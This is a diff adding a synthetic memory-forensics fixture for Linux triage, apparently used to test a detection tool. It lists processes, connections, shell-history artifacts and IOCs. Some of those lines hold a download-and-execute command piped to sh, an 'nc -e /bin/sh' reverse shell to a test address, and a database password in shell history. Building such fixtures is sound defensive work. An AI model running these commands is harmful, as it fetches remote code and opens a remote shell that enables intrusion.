@@ -1,0 +1,22 @@
+{"kind":"header","schema_version":"memory.v1","job_id":"6a1f0c1e-8d6b-4c55-9d9e-0d1b6f5a1002","profile":"triage","os":"linux","engine":"replay","tool_versions":{"fixture":"synthetic hand-written fixture (not a real image, not real analysis)","volatility3":"2.28.2"},"symbols":{"status":"resolved","isf_sha256":"cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"},"plugins":[{"plugin":"linux.pslist","status":"ok","rows":1,"truncated":false,"duration_ms":1000},{"plugin":"linux.psaux","status":"ok","rows":1,"truncated":false,"duration_ms":1000},{"plugin":"linux.bash","status":"ok","rows":1,"truncated":false,"duration_ms":1000},{"plugin":"linux.sockstat","status":"ok","rows":1,"truncated":false,"duration_ms":1000}],"audit_events":{},"engine_errors":[],"truncated":{}}
+{"kind":"image","size_bytes":67108864,"sha256":"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb","layer":"LimeLayer>Intel32e","arch":"x64","kernel_banner":"Linux version 6.1.0-26-amd64 (debian-kernel@lists.debian.org) (gcc-12 (Debian 12.2.0-14) 12.2.0) #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30)","system_time":"2026-11-01T08:30:00Z"}
+{"kind":"process","pid":1,"ppid":0,"name":"systemd","offset":18446631923540295680,"create_time":"2026-11-01T08:00:00Z","threads":1,"sources":["pslist"],"cmdline":"/sbin/init"}
+{"kind":"process","pid":2,"ppid":0,"name":"kthreadd","offset":18446631923540303872,"create_time":"2026-11-01T08:01:00Z","threads":1,"sources":["pslist"],"cmdline":null}
+{"kind":"process","pid":412,"ppid":1,"name":"systemd-journal","offset":18446631923540312064,"create_time":"2026-11-01T08:02:00Z","threads":1,"sources":["pslist"],"cmdline":"/lib/systemd/systemd-journald"}
+{"kind":"process","pid":640,"ppid":1,"name":"sshd","offset":18446631923540320256,"create_time":"2026-11-01T08:03:00Z","threads":1,"sources":["pslist"],"cmdline":"/usr/sbin/sshd -D"}
+{"kind":"process","pid":701,"ppid":1,"name":"cron","offset":18446631923540328448,"create_time":"2026-11-01T08:04:00Z","threads":1,"sources":["pslist"],"cmdline":"/usr/sbin/cron -f"}
+{"kind":"process","pid":1022,"ppid":640,"name":"sshd","offset":18446631923540336640,"create_time":"2026-11-01T08:05:00Z","threads":1,"sources":["pslist"],"cmdline":"sshd: deploy [priv]"}
+{"kind":"process","pid":1030,"ppid":1022,"name":"bash","offset":18446631923540344832,"create_time":"2026-11-01T08:06:00Z","threads":1,"sources":["pslist"],"cmdline":"-bash"}
+{"kind":"process","pid":1101,"ppid":1030,"name":"sh","offset":18446631923540353024,"create_time":"2026-11-01T08:07:00Z","threads":1,"sources":["pslist"],"cmdline":"sh -c curl -s http://198.51.100.7/x.sh | sh"}
+{"kind":"process","pid":1102,"ppid":1101,"name":"nc","offset":18446631923540361216,"create_time":"2026-11-01T08:08:00Z","threads":1,"sources":["pslist"],"cmdline":"nc -e /bin/sh 198.51.100.7 4444"}
+{"kind":"connection","proto":"tcp","local_addr":"10.0.0.20","local_port":22,"state":"LISTEN","pid":640,"owner":"sshd"}
+{"kind":"connection","proto":"tcp","local_addr":"10.0.0.20","local_port":51234,"remote_addr":"198.51.100.7","remote_port":4444,"state":"ESTABLISHED","pid":1102,"owner":"nc"}
+{"kind":"connection","proto":"unix","pid":412,"owner":"systemd-journal"}
+{"kind":"artifact","type":"bash","pid":1030,"attributes":{"command":"curl -s http://198.51.100.7/x.sh | sh","time":"2026-11-01T08:07:00Z"}}
+{"kind":"artifact","type":"bash","pid":1030,"attributes":{"command":"mysql -u root -pHunter2pass appdb","time":"2026-11-01T08:06:00Z"}}
+{"kind":"finding","finding_id":"8b7c2f1a-5f0e-4a7e-9a11-000000000011","ts":"2026-11-01T08:30:00Z","type":"mem_linux_shell_history","title":"Shell history pipes a download into a shell","description":"bash pid 1030: curl -s http://198.51.100.7/x.sh | sh","severity":"medium","confidence":0.7,"detection_method":"heuristic:mem_linux_shell_history@1","evidence_refs":["pid:1030"]}
+{"kind":"ioc","type":"url","value":"http://198.51.100.7/x.sh","first_seen":"2026-11-01T08:07:00Z","last_seen":"2026-11-01T08:07:00Z","count":1,"source":"bash"}
+{"kind":"ioc","type":"ip","value":"198.51.100.7","first_seen":"2026-11-01T08:08:00Z","last_seen":"2026-11-01T08:08:00Z","count":2,"source":"connection"}
+{"kind":"timeline","ts":"2026-11-01T08:30:00Z","event":"system_time","title":"Image system time"}
+{"kind":"timeline","ts":"2026-11-01T08:08:00Z","event":"process_start","title":"nc started","pid":1102}
+{"kind":"trailer","line_count":21,"sha256":"398a233bee65d8c46878a8d085b8ea2baff725870aa91aef6fd03ccf8163e709"}
